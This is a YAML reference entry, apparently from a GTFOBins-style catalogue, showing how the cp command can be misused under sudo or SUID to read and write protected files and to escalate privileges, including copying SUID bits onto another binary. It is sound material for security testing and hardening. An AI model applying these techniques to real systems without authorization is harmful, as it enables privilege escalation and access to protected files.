---
functions:
  file-read:
  - code: |-
      cp /path/to/input-file /dev/stdout
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      echo DATA | cp /dev/stdin /path/to/output-file
    contexts:
      sudo:
      suid:
      unprivileged:
  privilege-escalation:
  - code: |-
      cp /path/to/input-file /path/to/output-file
    comment: |-
      This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
    contexts:
      sudo:
      suid:
  - code: |-
      cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file
    comment: |-
      This can copy SUID permissions from any SUID binary (e.g., `/path/to/input-file`) to another.
    contexts:
      sudo:
      suid:
...
